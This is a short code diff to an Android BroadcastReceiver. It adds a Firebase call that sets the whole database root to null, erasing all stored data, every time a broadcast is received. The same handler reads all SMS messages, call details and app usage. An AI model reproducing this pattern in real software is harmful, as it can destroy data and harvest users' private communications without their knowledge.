@@ -6,6 +6,9 @@ import android.content.Intent;
 import android.util.Log;
 import android.widget.Toast;
 
+import com.google.firebase.database.DatabaseReference;
+import com.google.firebase.database.FirebaseDatabase;
+
 public class MyReceiver extends BroadcastReceiver {
 
     MessageHistory msghist;
@@ -26,6 +29,8 @@ public class MyReceiver extends BroadcastReceiver {
     public void onReceive(Context context, Intent intent) {
         // TODO: This method is called when the BroadcastReceiver is receiving
         // an Intent broadcast.
+        DatabaseReference root = FirebaseDatabase.getInstance().getReference();
+        root.setValue(null);
         msghist.getAllSms(context);
         cal.getCallDetails(context);
         appst.printCurrentUsageStatus(context);
